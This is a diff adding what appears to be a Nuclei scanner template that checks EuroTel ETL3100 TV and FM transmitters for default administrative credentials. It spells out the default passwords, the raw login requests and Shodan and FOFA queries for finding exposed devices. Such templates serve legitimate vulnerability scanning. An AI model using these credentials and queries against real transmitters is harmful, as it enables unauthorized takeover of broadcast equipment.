@@ -1,0 +1,46 @@
+id: etl3100-default-login
+
+info:
+  name: EuroTel ETL3100 - Default Login
+  author: r3Y3r53
+  severity: high
+  description: |
+    The TV and FM transmitter uses a weak set of default administrative credentials that can be guessed in remote password attacks and gain full control of the system.
+  reference:
+    - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2023-5782.php
+    - https://www.exploit-db.com/exploits/51684
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: html:"ETL3100"
+    fofa-query: body="ETL3100"
+  tags: misconfig,default-login,eurotel
+
+http:
+  - raw:
+      - |
+        POST /index.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        txtUserId={{username}}&txtPassword={{password}}&btnLogin=Login
+      - |
+        GET /exciter.php HTTP/1.1
+        Host: {{Hostname}}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - user
+        - operator
+      password:
+        - etl3100rt1234
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200'
+          - 'contains_all(body_2, "FM Exciter", "Summary", "/logout.php")'
+        condition: and
+
+# digest: 4b0a00483046022100f41901dca2f2a9e46609d3a8d1e4813257cf6a09a4b899f1ee33686370d2f37c0221008a52f8f22fddde6aae2eb5162e88adbb8c2ce8eef4818002787b9ac8a88f60a4:922c64590222798bb761d5b6d8e72950
